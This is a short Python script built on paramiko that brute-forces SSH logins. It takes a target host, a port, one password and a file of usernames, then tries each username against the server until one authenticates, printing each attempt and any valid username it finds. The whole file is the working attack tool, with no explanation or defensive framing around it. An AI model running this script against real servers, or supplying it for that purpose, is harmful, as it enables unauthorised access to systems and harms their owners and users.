import paramiko

host = input('Enter the host: ')
port = input('Enter the port (default is 22): ') or 22
password = input('Enter the password: ')
username_file = input('Enter the path to the username list file: ')
attempts = 0

with open(username_file) as username_list:
    for username in username_list:
        username = username.strip("\n")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            print("[{}] Attempting username: {}".format(attempts, username))
            ssh.connect(host, port, username, password, timeout=1)
            print("[>] Valid username found: {}".format(username))
            ssh.close()
            break
        except paramiko.ssh_exception.AuthenticationException:
            print("[!] Invalid username!")
            attempts += 1
        except Exception as e:
            print("[!] An error occurred:", str(e))
            ssh.close()
